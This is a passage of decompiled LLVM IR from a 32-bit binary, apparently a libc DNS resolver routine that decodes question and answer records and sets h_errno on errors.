  %v3_8052ca7 = load i8, i8* %v2_8052ca7, align 1
  %v4_8052ca7 = icmp eq i8 %v3_8052ca7, 0
  %v1_8052cac = icmp eq i1 %v4_8052ca7, false
  br i1 %v1_8052cac, label %dec_label_pc_8052cfd, label %dec_label_pc_8052cae

dec_label_pc_8052cae:                             ; preds = %dec_label_pc_8052ca7
  %v0_8052cae = load i32, i32* @ecx, align 4
  %v2_8052cae = add i32 %v0_8052c84, 12
  %v3_8052cae = inttoptr i32 %v2_8052cae to i32*
  store i32 %v0_8052cae, i32* %v3_8052cae, align 4
  %v1_8052caf = add i32 %v0_8052c84, 8
  %v2_8052caf = inttoptr i32 %v1_8052caf to i32*
  store i32 ptrtoint (i32* @global_var_8059ac8.220 to i32), i32* %v2_8052caf, align 4
  %v1_8052cb4 = add i32 %v0_8052c84, 4
  %v2_8052cb4 = inttoptr i32 %v1_8052cb4 to i32*
  store i32 134550975, i32* %v2_8052cb4, align 4
  %v1_8052cb9 = add i32 %v0_8052c84, 200
  store i32 %v1_8052cb9, i32* @esi, align 4
  %v3_8052cc0 = inttoptr i32 %v0_8052c84 to i32*
  store i32 %v1_8052cb9, i32* %v3_8052cc0, align 4
  %v2_8052cc1 = call i32 @__pthread_return_void(i32 -1, i32 %v15_80529a8)
  store i32 %v2_8052cc1, i32* %eax.global-to-local, align 4
  %v0_8052cc6 = load i32, i32* @esp, align 4
  %v1_8052cc6 = inttoptr i32 %v0_8052cc6 to i32*
  store i32 ptrtoint (i32* @global_var_8059ac8.220 to i32), i32* %v1_8052cc6, align 4
  %v1_8052ccd = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8052ccd, i32* %eax.global-to-local, align 4
  %v0_8052cd2 = load i32, i32* @esp, align 4
  %v1_8052cd2 = inttoptr i32 %v0_8052cd2 to i32*
  %v2_8052cd2 = load i32, i32* %v1_8052cd2, align 4
  store i32 %v2_8052cd2, i32* @eax, align 4
  %v3_8052cd2 = add i32 %v0_8052cd2, 4
  %v1_8052cd3 = inttoptr i32 %v3_8052cd2 to i32*
  %v2_8052cd3 = load i32, i32* %v1_8052cd3, align 4
  store i32 %v2_8052cd3, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8052cd3, align 4
  %v0_8052cd6 = load i32, i32* @esi, align 4
  store i32 %v0_8052cd6, i32* %v1_8052cd2, align 4
  %v0_8052cd7 = load i32, i32* @global_var_80601b8.281, align 8
  store i32 %v0_8052cd7, i32* %ebx.global-to-local, align 4
  %v2_8052cdd = call i32 @__pthread_return_void(i32 -1, i32 %v15_80529a8)
  store i32 %v2_8052cdd, i32* %eax.global-to-local, align 4
  %v0_8052ce2 = load i32, i32* @esp, align 4
  %v1_8052ce5 = add i32 %v0_8052cd7, -1
  store i32 %v1_8052ce5, i32* @ebx, align 4
  %v1_8052ce6 = add i32 %v0_8052ce2, 52
  %v2_8052ce6 = inttoptr i32 %v1_8052ce6 to i32*
  %v3_8052ce6 = load i32, i32* %v2_8052ce6, align 4
  %v5_8052ce6 = sub i32 %v3_8052ce6, %v1_8052ce5
  %v11_8052ce6 = xor i32 %v3_8052ce6, %v1_8052ce5
  %v12_8052ce6 = xor i32 %v5_8052ce6, %v3_8052ce6
  %v13_8052ce6 = and i32 %v12_8052ce6, %v11_8052ce6
  %v14_8052ce6 = icmp slt i32 %v13_8052ce6, 0
  %v16_8052ce6 = icmp slt i32 %v5_8052ce6, 0
  %v2_8052cea = icmp eq i1 %v16_8052ce6, %v14_8052ce6
  br i1 %v2_8052cea, label %dec_label_pc_8052cfd, label %dec_label_pc_8052cec

dec_label_pc_8052cec:                             ; preds = %dec_label_pc_8052cae
  %v4_8052cec = add i32 %v3_8052ce6, 1
  store i32 %v4_8052cec, i32* %v2_8052ce6, align 4
  %v0_8052cf0 = load i32, i32* @esp, align 4
  %v1_8052cf0 = add i32 %v0_8052cf0, 56
  %v2_8052cf0 = inttoptr i32 %v1_8052cf0 to i32*
  %v3_8052cf0 = load i32, i32* %v2_8052cf0, align 4
  store i32 %v3_8052cf0, i32* %edx.global-to-local, align 4
  %v2_8052cf4 = add i32 %v0_8052cf0, 44
  %v3_8052cf4 = inttoptr i32 %v2_8052cf4 to i32*
  store i32 %v3_8052cf0, i32* %v3_8052cf4, align 4
  br label %dec_label_pc_8052f88.backedge

dec_label_pc_8052cfd:                             ; preds = %dec_label_pc_8052cae, %dec_label_pc_8052ca7
  %v0_8052cfd = call i32 @__GI___h_errno_location()
  store i32 %v0_8052cfd, i32* %eax.global-to-local, align 4
  %v1_8052d02 = inttoptr i32 %v0_8052cfd to i32*
  store i32 1, i32* %v1_8052d02, align 4
  br label %dec_label_pc_8052fc0

dec_label_pc_8052d0d:                             ; preds = %dec_label_pc_8052c9e
  %v1_8052d0d = icmp eq i32 %v3_8052c9e, 0
  %v1_8052d0f = icmp eq i1 %v1_8052d0d, false
  br i1 %v1_8052d0f, label %dec_label_pc_8052f1c, label %dec_label_pc_8052d15

dec_label_pc_8052d15:                             ; preds = %dec_label_pc_8052d0d
  %v1_8052d15 = add i32 %v0_8052c84, 120
  %v2_8052d15 = inttoptr i32 %v1_8052d15 to i32*
  %v3_8052d15 = load i32, i32* %v2_8052d15, align 4
  %tmp49 = icmp slt i32 %v3_8052d15, 1
  br i1 %tmp49, label %dec_label_pc_8052d25, label %dec_label_pc_8052d1c

dec_label_pc_8052d1c:                             ; preds = %dec_label_pc_8052d15
  store i32 0, i32* @ebx, align 4
  store i32 12, i32* @esi, align 4
  %v2_8052d4455 = add i32 %v0_8052c84, 116
  %v3_8052d4456 = inttoptr i32 %v2_8052d4455 to i32*
  %v4_8052d4457 = load i32, i32* %v3_8052d4456, align 4
  %v5_8052d4458 = sub i32 0, %v4_8052d4457
  %v13_8052d4462 = and i32 %v4_8052d4457, %v5_8052d4458
  %v14_8052d4463 = icmp slt i32 %v13_8052d4462, 0
  %v16_8052d4465 = icmp slt i32 %v5_8052d4458, 0
  %v2_8052d4866 = icmp eq i1 %v16_8052d4465, %v14_8052d4463
  br i1 %v2_8052d4866, label %dec_label_pc_8052d4a, label %dec_label_pc_8052d35

dec_label_pc_8052d25:                             ; preds = %dec_label_pc_8052d15
  %v0_8052d25 = call i32 @__GI___h_errno_location()
  store i32 %v0_8052d25, i32* %eax.global-to-local, align 4
  %v1_8052d2a = inttoptr i32 %v0_8052d25 to i32*
  store i32 4, i32* %v1_8052d2a, align 4
  br label %dec_label_pc_8052fc0

dec_label_pc_8052d35:                             ; preds = %dec_label_pc_8052d1c, %dec_label_pc_8052d35
  %v0_8052d4c68 = phi i32 [ %v1_8052d41, %dec_label_pc_8052d35 ], [ %v1_8052c84, %dec_label_pc_8052d1c ]
  %v0_8052d3567 = phi i32 [ %v0_8052d39, %dec_label_pc_8052d35 ], [ %v3_8052c9e, %dec_label_pc_8052d1c ]
  %v2_8052d35 = add i32 %v0_8052d4c68, -4
  %v3_8052d35 = inttoptr i32 %v2_8052d35 to i32*
  store i32 %v0_8052d3567, i32* %v3_8052d35, align 4
  %v0_8052d36 = load i32, i32* @eax, align 4
  %v2_8052d36 = add i32 %v0_8052d4c68, -8
  %v3_8052d36 = inttoptr i32 %v2_8052d36 to i32*
  store i32 %v0_8052d36, i32* %v3_8052d36, align 4
  %v0_8052d37 = load i32, i32* @esi, align 4
  %v2_8052d37 = add i32 %v0_8052d4c68, -12
  %v3_8052d37 = inttoptr i32 %v2_8052d37 to i32*
  store i32 %v0_8052d37, i32* %v3_8052d37, align 4
  %v2_8052d38 = add i32 %v0_8052d4c68, -16
  %v3_8052d38 = inttoptr i32 %v2_8052d38 to i32*
  store i32 %v2_805291a, i32* %v3_8052d38, align 4
  %v0_8052d39 = call i32 @__length_question()
  store i32 %v0_8052d39, i32* @eax, align 4
  %v0_8052d3e = load i32, i32* @ebx, align 4
  %v1_8052d3e = add i32 %v0_8052d3e, 1
  store i32 %v1_8052d3e, i32* @ebx, align 4
  %v0_8052d3f = load i32, i32* @esi, align 4
  %v2_8052d3f = add i32 %v0_8052d3f, %v0_8052d39
  store i32 %v2_8052d3f, i32* @esi, align 4
  %v0_8052d41 = load i32, i32* @esp, align 4
  %v1_8052d41 = add i32 %v0_8052d41, 16
  %v2_8052d44 = add i32 %v0_8052d41, 116
  %v3_8052d44 = inttoptr i32 %v2_8052d44 to i32*
  %v4_8052d44 = load i32, i32* %v3_8052d44, align 4
  %v5_8052d44 = sub i32 %v1_8052d3e, %v4_8052d44
  %v11_8052d44 = xor i32 %v4_8052d44, %v1_8052d3e
  %v12_8052d44 = xor i32 %v5_8052d44, %v1_8052d3e
  %v13_8052d44 = and i32 %v12_8052d44, %v11_8052d44
  %v14_8052d44 = icmp slt i32 %v13_8052d44, 0
  %v16_8052d44 = icmp slt i32 %v5_8052d44, 0
  %v2_8052d48 = icmp eq i1 %v16_8052d44, %v14_8052d44
  br i1 %v2_8052d48, label %dec_label_pc_8052d4a, label %dec_label_pc_8052d35

dec_label_pc_8052d4a:                             ; preds = %dec_label_pc_8052d35, %dec_label_pc_8052d1c
  %v0_8052d4c.lcssa = phi i32 [ %v1_8052c84, %dec_label_pc_8052d1c ], [ %v1_8052d41, %dec_label_pc_8052d35 ]
  store i32 0, i32* @ebx, align 4
  %v1_8052d4c = add i32 %v0_8052d4c.lcssa, 27
  %v2_8052d4c = inttoptr i32 %v1_8052d4c to i8*
  store i8 1, i8* %v2_8052d4c, align 1
  %v0_8052e7a.pre = load i32, i32* @ebx, align 4
  %v1_8052e7a.pre = load i32, i32* @esp, align 4
  %v2_8052e7a69 = add i32 %v1_8052e7a.pre, 104
  %v3_8052e7a70 = inttoptr i32 %v2_8052e7a69 to i32*
  %v4_8052e7a71 = load i32, i32* %v3_8052e7a70, align 4
  %v5_8052e7a72 = sub i32 %v0_8052e7a.pre, %v4_8052e7a71
  %v11_8052e7a74 = xor i32 %v4_8052e7a71, %v0_8052e7a.pre
  %v12_8052e7a75 = xor i32 %v5_8052e7a72, %v0_8052e7a.pre
  %v13_8052e7a76 = and i32 %v12_8052e7a75, %v11_8052e7a74
  %v14_8052e7a77 = icmp slt i32 %v13_8052e7a76, 0
  %v16_8052e7a79 = icmp slt i32 %v5_8052e7a72, 0
  %v2_8052e7e80 = icmp eq i1 %v16_8052e7a79, %v14_8052e7a77
  br i1 %v2_8052e7e80, label %dec_label_pc_8052e8a, label %dec_label_pc_8052e80.lr.ph

dec_label_pc_8052e80.lr.ph:                       ; preds = %dec_label_pc_8052d4a
  %v0_8052e80.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052e80

dec_label_pc_8052d56:                             ; preds = %dec_label_pc_8052e80
  %v1_8052d56 = add i32 %v0_8052d5681, 116
  store i32 %v1_8052d56, i32* %eax.global-to-local, align 4
  %v2_8052d5a = add i32 %v0_8052d5681, -4
  %v3_8052d5a = inttoptr i32 %v2_8052d5a to i32*
  store i32 %v1_8052d56, i32* %v3_8052d5a, align 4
  %v3_8052d5b = load i32, i32* %v3_8052e80, align 4
  %v5_8052d5b = add i32 %v0_8052d5681, -8
  %v6_8052d5b = inttoptr i32 %v5_8052d5b to i32*
  store i32 %v3_8052d5b, i32* %v6_8052d5b, align 4
  %v0_8052d5f = load i32, i32* @esi, align 4
  %v2_8052d5f = add i32 %v0_8052d5681, -12
  %v3_8052d5f = inttoptr i32 %v2_8052d5f to i32*
  store i32 %v0_8052d5f, i32* %v3_8052d5f, align 4
  %v2_8052d60 = add i32 %v0_8052d5681, -16
  %v3_8052d60 = inttoptr i32 %v2_8052d60 to i32*
  store i32 %v2_805291a, i32* %v3_8052d60, align 4
  %v0_8052d61 = call i32 @__decode_answer()
  store i32 %v0_8052d61, i32* @eax, align 4
  %v1_8052d66 = load i32, i32* @esp, align 4
  %v2_8052d66 = add i32 %v1_8052d66, 68
  %v3_8052d66 = inttoptr i32 %v2_8052d66 to i32*
  store i32 %v0_8052d61, i32* %v3_8052d66, align 4
  %v0_8052d6a = load i32, i32* @esp, align 4
  %v1_8052d6a = add i32 %v0_8052d6a, 16
  %v2_8052d6d = icmp slt i32 %v0_8052d61, 0
  %v1_8052d6f = icmp eq i1 %v2_8052d6d, false
  br i1 %v1_8052d6f, label %dec_label_pc_8052d89, label %dec_label_pc_8052d71

dec_label_pc_8052d71:                             ; preds = %dec_label_pc_8052d56
  %v0_8052d71 = load i32, i32* @ebx, align 4
  %v1_8052d71 = icmp eq i32 %v0_8052d71, 0
  br i1 %v1_8052d71, label %dec_label_pc_8052f1c, label %dec_label_pc_8052d79

dec_label_pc_8052d79:                             ; preds = %dec_label_pc_8052d71
  %v1_8052d79 = add i32 %v0_8052d6a, 100
  %v2_8052d79 = inttoptr i32 %v1_8052d79 to i32*
  %v3_8052d79 = load i32, i32* %v2_8052d79, align 4
  %v4_8052d79 = icmp eq i32 %v3_8052d79, 0
  br i1 %v4_8052d79, label %dec_label_pc_8052f1c, label %dec_label_pc_8052e8a

dec_label_pc_8052d89:                             ; preds = %dec_label_pc_8052d56
  %v1_8052d89 = add i32 %v0_8052d6a, 43
  %v2_8052d89 = inttoptr i32 %v1_8052d89 to i8*
  %v3_8052d89 = load i8, i8* %v2_8052d89, align 1
  %v4_8052d89 = icmp eq i8 %v3_8052d89, 0
  br i1 %v4_8052d89, label %dec_label_pc_8052e2a, label %dec_label_pc_8052d94

dec_label_pc_8052d94:                             ; preds = %dec_label_pc_8052d89
  %v0_8052d94 = load i32, i32* @edi, align 4
  %v1_8052d94 = add i32 %v0_8052d94, 28
  %v2_8052d94 = inttoptr i32 %v1_8052d94 to i32*
  %v3_8052d94 = load i32, i32* %v2_8052d94, align 4
  store i32 %v3_8052d94, i32* %eax.global-to-local, align 4
  %v2_8052d97 = add i32 %v0_8052d6a, 160
  %v3_8052d97 = inttoptr i32 %v2_8052d97 to i32*
  store i32 %v3_8052d94, i32* %v3_8052d97, align 4
  %v0_8052d9e = load i32, i32* @edi, align 4
  %v1_8052d9e = add i32 %v0_8052d9e, 32
  %v2_8052d9e = inttoptr i32 %v1_8052d9e to i32*
  %v3_8052d9e = load i32, i32* %v2_8052d9e, align 4
  store i32 %v3_8052d9e, i32* %eax.global-to-local, align 4
  %v1_8052da1 = load i32, i32* @esp, align 4
  %v2_8052da1 = add i32 %v1_8052da1, 148
  %v3_8052da1 = inttoptr i32 %v2_8052da1 to i32*
  store i32 %v3_8052d9e, i32* %v3_8052da1, align 4
  %v0_8052da8 = load i32, i32* @edi, align 4
  %v1_8052da8 = add i32 %v0_8052da8, 36
  %v2_8052da8 = inttoptr i32 %v1_8052da8 to i32*
  %v3_8052da8 = load i32, i32* %v2_8052da8, align 4
  store i32 %v3_8052da8, i32* %eax.global-to-local, align 4
  %v1_8052dab = load i32, i32* @esp, align 4
  %v2_8052dab = add i32 %v1_8052dab, 152
  %v3_8052dab = inttoptr i32 %v2_8052dab to i32*
  store i32 %v3_8052da8, i32* %v3_8052dab, align 4
  %v0_8052db2 = load i32, i32* @ecx, align 4
  %v1_8052db2 = load i32, i32* @esp, align 4
  %v2_8052db2 = add i32 %v1_8052db2, -4
  %v3_8052db2 = inttoptr i32 %v2_8052db2 to i32*
  store i32 %v0_8052db2, i32* %v3_8052db2, align 4
  %v1_8052db3 = add i32 %v1_8052db2, -8
  %v2_8052db3 = inttoptr i32 %v1_8052db3 to i32*
  store i32 40, i32* %v2_8052db3, align 4
  %v1_8052db5 = add i32 %v1_8052db2, 116
  store i32 %v1_8052db5, i32* %edx.global-to-local, align 4
  %v2_8052db9 = add i32 %v1_8052db2, -12
  %v3_8052db9 = inttoptr i32 %v2_8052db9 to i32*
  store i32 %v1_8052db5, i32* %v3_8052db9, align 4
  %v0_8052dba = load i32, i32* @edi, align 4
  %v2_8052dba = add i32 %v1_8052db2, -16
  %v3_8052dba = inttoptr i32 %v2_8052dba to i32*
  store i32 %v0_8052dba, i32* %v3_8052dba, align 4
  %v5_8052dbb = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_80529a8, i32 %v3_8052a07)
  store i32 %v5_8052dbb, i32* %eax.global-to-local, align 4
  %v0_8052dc0 = load i32, i32* @edi, align 4
  %v1_8052dc0 = add i32 %v0_8052dc0, 4
  %v2_8052dc0 = inttoptr i32 %v1_8052dc0 to i32*
  %v3_8052dc0 = load i32, i32* %v2_8052dc0, align 4
  store i32 %v3_8052dc0, i32* %eax.global-to-local, align 4
  %v0_8052dc3 = load i32, i32* @esp, align 4
  %v1_8052dc3 = add i32 %v0_8052dc3, 16
  %v9_8052dc6 = icmp eq i32 %v3_8052dc0, 24
  br i1 %v9_8052dc6, label %dec_label_pc_8052d94.dec_label_pc_8052ded_crit_edge, label %dec_label_pc_8052dcb

dec_label_pc_8052d94.dec_label_pc_8052ded_crit_edge: ; preds = %dec_label_pc_8052d94
  %.pre24 = add i32 %v0_8052dc3, 260
  %.pre25 = inttoptr i32 %.pre24 to i32*
  %v4_8052ded.pre = load i32, i32* %.pre25, align 4
  br label %dec_label_pc_8052ded

dec_label_pc_8052dcb:                             ; preds = %dec_label_pc_8052d94
  %v1_8052dcb = add i32 %v0_8052dc0, 28
  %v2_8052dcb = inttoptr i32 %v1_8052dcb to i32*
  %v3_8052dcb = load i32, i32* %v2_8052dcb, align 4
  %v4_8052dcb = icmp eq i32 %v3_8052dcb, 0
  br i1 %v4_8052dcb, label %dec_label_pc_8052e8a, label %dec_label_pc_8052dd5

dec_label_pc_8052dd5:                             ; preds = %dec_label_pc_8052dcb
  %v1_8052dd5 = add i32 %v0_8052dc3, 260
  %v2_8052dd5 = inttoptr i32 %v1_8052dd5 to i32*
  %v3_8052dd5 = load i32, i32* %v2_8052dd5, align 4
  %v12_8052dd5 = icmp eq i32 %v3_8052dd5, 1
  br i1 %v12_8052dd5, label %dec_label_pc_8052ded, label %dec_label_pc_8052ddf

dec_label_pc_8052ddf:                             ; preds = %dec_label_pc_8052dd5
  %v12_8052ddf = icmp eq i32 %v3_8052dd5, 28
  %v1_8052de7 = icmp eq i1 %v12_8052ddf, false
  br i1 %v1_8052de7, label %dec_label_pc_8052e8a, label %dec_label_pc_8052ded

dec_label_pc_8052ded:                             ; preds = %dec_label_pc_8052d94.dec_label_pc_8052ded_crit_edge, %dec_label_pc_8052ddf, %dec_label_pc_8052dd5
  %v4_8052ded = phi i32 [ %v4_8052ded.pre, %dec_label_pc_8052d94.dec_label_pc_8052ded_crit_edge ], [ %v3_8052dd5, %dec_label_pc_8052ddf ], [ 1, %dec_label_pc_8052dd5 ]
  %v15_8052ded = icmp eq i32 %v3_8052dc0, %v4_8052ded
  br i1 %v15_8052ded, label %dec_label_pc_8052e02, label %dec_label_pc_8052df6

dec_label_pc_8052df6:                             ; preds = %dec_label_pc_8052ded
  %v1_8052df9 = inttoptr i32 %v0_8052dc0 to i32*
  %v2_8052df9 = load i32, i32* %v1_8052df9, align 4
  %v5_8052df9 = inttoptr i32 %v0_8052dc3 to i32*
  store i32 %v2_8052df9, i32* %v5_8052df9, align 4
  %v1_8052dfb = call i32 @free(i32 -1)
  store i32 %v1_8052dfb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052e72

dec_label_pc_8052e02:                             ; preds = %dec_label_pc_8052ded
  %v0_8052e02 = load i32, i32* @ebx, align 4
  %v1_8052e04 = sub i32 -1, %v0_8052e02
  store i32 %v1_8052e04, i32* %eax.global-to-local, align 4
  %v2_8052e06 = add i32 %v0_8052dc3, 120
  %v3_8052e06 = inttoptr i32 %v2_8052e06 to i32*
  %v4_8052e06 = load i32, i32* %v3_8052e06, align 4
  %v5_8052e06 = add i32 %v4_8052e06, %v1_8052e04
  store i32 %v5_8052e06, i32* %eax.global-to-local, align 4
  %v2_8052e0a = add i32 %v0_8052dc0, 36
  %v3_8052e0a = inttoptr i32 %v2_8052e0a to i32*
  store i32 %v5_8052e06, i32* %v3_8052e0a, align 4
  %v0_8052e0d = load i32, i32* @edi, align 4
  %v1_8052e0d = add i32 %v0_8052e0d, 16
  %v2_8052e0d = inttoptr i32 %v1_8052e0d to i32*
  %v3_8052e0d = load i32, i32* %v2_8052e0d, align 4
  %v1_8052e10 = add i32 %v3_8052e0d, 4
  store i32 %v1_8052e10, i32* %eax.global-to-local, align 4
  %v2_8052e13 = add i32 %v0_8052e0d, 36
  %v3_8052e13 = inttoptr i32 %v2_8052e13 to i32*
  %v4_8052e13 = load i32, i32* %v3_8052e13, align 4
  %v7_8052e13 = mul i32 %v4_8052e13, %v1_8052e10
  store i32 %v7_8052e13, i32* %eax.global-to-local, align 4
  %v2_8052e17 = add i32 %v0_8052e0d, 32
  %v3_8052e17 = inttoptr i32 %v2_8052e17 to i32*
  %v4_8052e17 = load i32, i32* %v3_8052e17, align 4
  %v6_8052e1a = icmp ugt i32 %v7_8052e13, %v4_8052e17
  br i1 %v6_8052e1a, label %dec_label_pc_8052e02.dec_label_pc_8052e8a.loopexit_crit_edge, label %dec_label_pc_8052e1c

dec_label_pc_8052e02.dec_label_pc_8052e8a.loopexit_crit_edge: ; preds = %dec_label_pc_8052e02
  %v0_8052e8a.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052e8a

dec_label_pc_8052e1c:                             ; preds = %dec_label_pc_8052e02
  store i32 0, i32* %v3_8052e13, align 4
  %v0_8052e23 = load i32, i32* @esp, align 4
  %v1_8052e23 = add i32 %v0_8052e23, 27
  %v2_8052e23 = inttoptr i32 %v1_8052e23 to i8*
  store i8 0, i8* %v2_8052e23, align 1
  %v1_8052e75.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052e75

dec_label_pc_8052e2a:                             ; preds = %dec_label_pc_8052d89
  %v1_8052e2d = add i32 %v0_8052d6a, 132
  %v2_8052e2d = inttoptr i32 %v1_8052e2d to i32*
  %v3_8052e2d = load i32, i32* %v2_8052e2d, align 4
  %v6_8052e2d = inttoptr i32 %v0_8052d6a to i32*
  store i32 %v3_8052e2d, i32* %v6_8052e2d, align 4
  %v1_8052e34 = call i32 @free(i32 -1)
  store i32 %v1_8052e34, i32* %eax.global-to-local, align 4
  %v0_8052e39 = load i32, i32* @esp, align 4
  %v1_8052e39 = add i32 %v0_8052e39, 16
  %v1_8052e3c = add i32 %v0_8052e39, 260
  %v2_8052e3c = inttoptr i32 %v1_8052e3c to i32*
  %v3_8052e3c = load i32, i32* %v2_8052e3c, align 4
  store i32 %v3_8052e3c, i32* %eax.global-to-local, align 4
  %v1_8052e43 = add i32 %v0_8052e39, 136
  %v2_8052e43 = inttoptr i32 %v1_8052e43 to i32*
  %v3_8052e43 = load i32, i32* %v2_8052e43, align 4
  %v15_8052e43 = icmp eq i32 %v3_8052e43, %v3_8052e3c
  %v1_8052e47 = icmp eq i1 %v15_8052e43, false
  br i1 %v1_8052e47, label %dec_label_pc_8052e75, label %dec_label_pc_8052e49

dec_label_pc_8052e49:                             ; preds = %dec_label_pc_8052e2a
  %v0_8052e49 = load i32, i32* @edi, align 4
  %v1_8052e49 = add i32 %v0_8052e49, 16
  %v2_8052e49 = inttoptr i32 %v1_8052e49 to i32*
  %v3_8052e49 = load i32, i32* %v2_8052e49, align 4
  store i32 %v3_8052e49, i32* %eax.global-to-local, align 4
  %v2_8052e4c = add i32 %v0_8052e39, 148
  %v3_8052e4c = inttoptr i32 %v2_8052e4c to i32*
  %v4_8052e4c = load i32, i32* %v3_8052e4c, align 4
  %v15_8052e4c = icmp eq i32 %v3_8052e49, %v4_8052e4c
  %v1_8052e53 = icmp eq i1 %v15_8052e4c, false
  br i1 %v1_8052e53, label %dec_label_pc_8052f0f, label %dec_label_pc_8052e59

dec_label_pc_8052e59:                             ; preds = %dec_label_pc_8052e49
  %v0_8052e59 = load i32, i32* @edx, align 4
  %v2_8052e59 = add i32 %v0_8052e39, 12
  %v3_8052e59 = inttoptr i32 %v2_8052e59 to i32*
  store i32 %v0_8052e59, i32* %v3_8052e59, align 4
  %v0_8052e5a = load i32, i32* %eax.global-to-local, align 4
  %v2_8052e5a = add i32 %v0_8052e39, 8
  %v3_8052e5a = inttoptr i32 %v2_8052e5a to i32*
  store i32 %v0_8052e5a, i32* %v3_8052e5a, align 4
  %v1_8052e5b = add i32 %v0_8052e39, 152
  %v2_8052e5b = inttoptr i32 %v1_8052e5b to i32*
  %v3_8052e5b = load i32, i32* %v2_8052e5b, align 4
  %v5_8052e5b = add i32 %v0_8052e39, 4
  %v6_8052e5b = inttoptr i32 %v5_8052e5b to i32*
  store i32 %v3_8052e5b, i32* %v6_8052e5b, align 4
  %v0_8052e62 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052e62 = load i32, i32* @edi, align 4
  %v2_8052e62 = add i32 %v1_8052e62, 36
  %v3_8052e62 = inttoptr i32 %v2_8052e62 to i32*
  %v4_8052e62 = load i32, i32* %v3_8052e62, align 4
  %v7_8052e62 = mul i32 %v4_8052e62, %v0_8052e62
  store i32 %v7_8052e62, i32* %eax.global-to-local, align 4
  %v2_8052e66 = add i32 %v1_8052e62, 28
  %v3_8052e66 = inttoptr i32 %v2_8052e66 to i32*
  %v4_8052e66 = load i32, i32* %v3_8052e66, align 4
  %v5_8052e66 = add i32 %v4_8052e66, %v7_8052e62
  store i32 %v5_8052e66, i32* %eax.global-to-local, align 4
  %v3_8052e69 = inttoptr i32 %v0_8052e39 to i32*
  store i32 %v5_8052e66, i32* %v3_8052e69, align 4
  %v5_8052e6a = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_80529a8, i32 %v3_8052a07)
  store i32 %v5_8052e6a, i32* %eax.global-to-local, align 4
  %v0_8052e6f = load i32, i32* @edi, align 4
  %v1_8052e6f = add i32 %v0_8052e6f, 36
  %v2_8052e6f = inttoptr i32 %v1_8052e6f to i32*
  %v3_8052e6f = load i32, i32* %v2_8052e6f, align 4
  %v4_8052e6f = add i32 %v3_8052e6f, 1
  store i32 %v4_8052e6f, i32* %v2_8052e6f, align 4
  br label %dec_label_pc_8052e72

dec_label_pc_8052e72:                             ; preds = %dec_label_pc_8052df6, %dec_label_pc_8052e59
  %v0_8052e72 = load i32, i32* @esp, align 4
  %v1_8052e72 = add i32 %v0_8052e72, 16
  br label %dec_label_pc_8052e75

dec_label_pc_8052e75:                             ; preds = %dec_label_pc_8052e2a, %dec_label_pc_8052e1c, %dec_label_pc_8052e72
  %v1_8052e75 = phi i32 [ %v1_8052e39, %dec_label_pc_8052e2a ], [ %v1_8052e75.pre, %dec_label_pc_8052e1c ], [ %v1_8052e72, %dec_label_pc_8052e72 ]
  %v0_8052e75 = load i32, i32* @esi, align 4
  %v2_8052e75 = add i32 %v1_8052e75, 52
  %v3_8052e75 = inttoptr i32 %v2_8052e75 to i32*
  %v4_8052e75 = load i32, i32* %v3_8052e75, align 4
  %v5_8052e75 = add i32 %v4_8052e75, %v0_8052e75
  store i32 %v5_8052e75, i32* @esi, align 4
  %v0_8052e79 = load i32, i32* @ebx, align 4
  %v1_8052e79 = add i32 %v0_8052e79, 1
  store i32 %v1_8052e79, i32* @ebx, align 4
  %v2_8052e7a = add i32 %v1_8052e75, 104
  %v3_8052e7a = inttoptr i32 %v2_8052e7a to i32*
  %v4_8052e7a = load i32, i32* %v3_8052e7a, align 4
  %v5_8052e7a = sub i32 %v1_8052e79, %v4_8052e7a
  %v11_8052e7a = xor i32 %v4_8052e7a, %v1_8052e79
  %v12_8052e7a = xor i32 %v5_8052e7a, %v1_8052e79
  %v13_8052e7a = and i32 %v12_8052e7a, %v11_8052e7a
  %v14_8052e7a = icmp slt i32 %v13_8052e7a, 0
  %v16_8052e7a = icmp slt i32 %v5_8052e7a, 0
  %v2_8052e7e = icmp eq i1 %v16_8052e7a, %v14_8052e7a
  br i1 %v2_8052e7e, label %dec_label_pc_8052e8a, label %dec_label_pc_8052e80

dec_label_pc_8052e80:                             ; preds = %dec_label_pc_8052e80.lr.ph, %dec_label_pc_8052e75
  %v0_8052e80 = phi i32 [ %v0_8052e80.pre, %dec_label_pc_8052e80.lr.ph ], [ %v5_8052e75, %dec_label_pc_8052e75 ]
  %v0_8052d5681 = phi i32 [ %v1_8052e7a.pre, %dec_label_pc_8052e80.lr.ph ], [ %v1_8052e75, %dec_label_pc_8052e75 ]
  %v2_8052e80 = add i32 %v0_8052d5681, 16
  %v3_8052e80 = inttoptr i32 %v2_8052e80 to i32*
  %v4_8052e80 = load i32, i32* %v3_8052e80, align 4
  %v5_8052e80 = sub i32 %v0_8052e80, %v4_8052e80
  %v11_8052e80 = xor i32 %v4_8052e80, %v0_8052e80
  %v12_8052e80 = xor i32 %v5_8052e80, %v0_8052e80
  %v13_8052e80 = and i32 %v12_8052e80, %v11_8052e80
  %v14_8052e80 = icmp slt i32 %v13_8052e80, 0
  %v16_8052e80 = icmp slt i32 %v5_8052e80, 0
  %v2_8052e84 = icmp eq i1 %v16_8052e80, %v14_8052e80
  br i1 %v2_8052e84, label %dec_label_pc_8052e8a, label %dec_label_pc_8052d56

dec_label_pc_8052e8a:                             ; preds = %dec_label_pc_8052d79, %dec_label_pc_8052d4a, %dec_label_pc_8052e75, %dec_label_pc_8052dcb, %dec_label_pc_8052ddf, %dec_label_pc_8052e80, %dec_label_pc_8052e02.dec_label_pc_8052e8a.loopexit_crit_edge
  %v0_8052e8a = phi i32 [ %v0_8052e8a.pre.pre, %dec_label_pc_8052e02.dec_label_pc_8052e8a.loopexit_crit_edge ], [ %v1_8052e7a.pre, %dec_label_pc_8052d4a ], [ %v1_8052e75, %dec_label_pc_8052e75 ], [ %v1_8052dc3, %dec_label_pc_8052dcb ], [ %v1_8052dc3, %dec_label_pc_8052ddf ], [ %v0_8052d5681, %dec_label_pc_8052e80 ], [ %v1_8052d6a, %dec_label_pc_8052d79 ]
  %v1_8052e8d = add i32 %v0_8052e8a, 20
